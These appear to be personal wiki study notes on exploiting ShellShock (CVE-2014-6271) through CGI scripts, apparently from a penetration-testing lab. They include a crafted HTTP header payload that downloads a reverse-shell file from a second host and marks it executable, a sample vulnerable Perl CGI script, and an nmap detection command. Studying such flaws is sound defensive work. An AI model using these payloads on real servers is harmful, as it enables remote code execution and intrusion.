Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-18T18:27:03-05:00

====== ShellShock ======
Created Thursday 18 November 2021

===== Description =====
* TODO


===== Vulnerability with regard to CGI =====

When dealing with CGI, [[+CVE-2014-6271]] comes into play.
{{{code: lang="texinfo" linenumbers="False"
env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id
}}}

* Here, envvar X gets assigned a value that lead to CE.

Let's take a look at this request:
{{{code: lang="texinfo" linenumbers="False"
GET /cgi-bin/admin.cgi HTTP/1.1
Host: 10.11.1.71
Meh: () { :;};/bin/bash -c "/tmp/rawa;/usr/bin/wget -q http://192.168.119.177:8080/revshell_rawa;/bin/chmod +x revshell_rawa"


}}}

* In this case, the Meh header takes the place of the X envvar.
When this request is being passed to the CGI, CGI transforms headers added by the user to enviroment variables prepended with HTTP_, so this translates to:
{{{code: lang="texinfo" linenumbers="False"
env HTTP_Meh='() { :;};/bin/bash -c "/tmp/rawa;/usr/bin/wget -q http://192.168.119.177:8080/revshell_rawa;/bin/chmod +x revshell_rawa"
}}}

The exploit is triggered when bash is called.

This means that in the program.cgi, there must be a call to bash for this to work.

===== Example program =====
{{{code: lang="texinfo" linenumbers="False"
www-data@alpha:/usr/lib/cgi-bin$ cat admin.cgi
cat admin.cgi
#!/usr/bin/perl -w

use strict;
use warnings;
use Sys::Statistics::Linux;
use Sys::Info;


print qq(Content-type: text/html\n\n);


my $lxs = Sys::Statistics::Linux->new( cpustats => 1 );
sleep(1);
my $stat = $lxs->get;
my $cpu  = $stat->cpustats->{cpu};

my $info = Sys::Info->new;
printf "<left><pre>Perl verion is %s<br>", $info->perl;
if(my $httpd = $info->httpd){
	printf "HTTP Server is $httpd<br>";
}
my $type = $info->device('CPU');
my $os  = $info->os;
printf "Operating System is %s<br>", $os->name( long => 1 );
printf "CPU: %s<br>", scalar $type->identify;

print "Statistics for CpuStats (all)<br>";
print "  user      $cpu->{user}<br>";
print "  nice      $cpu->{nice}<br>";
print "  system    $cpu->{system}<br>";
print "  idle      $cpu->{idle}<br>";
print "  ioWait    $cpu->{iowait}<br>";
print "  total     $cpu->{total}<br></left>";
print "<br>";
system("bash", "load.sh");        #  << This triggers the exploit
print "</pre>";
}}}



===== Remarks =====
Scan for vulnerability with nmap:
{{{code: lang="texinfo" linenumbers="False"
nmap <ip> -p 80 --script=http-shellshock --script-args uri=/cgi-bin/<progam>.cgi 
}}}




===== SEE =====
https://github.com/mubix/shellshocker-pocs
https://www6.uniovi.es/~antonio/ncsa_httpd/cgi/env.html

[[AttackVectors:Web:CGI]]
[[Technologies:CGI]]




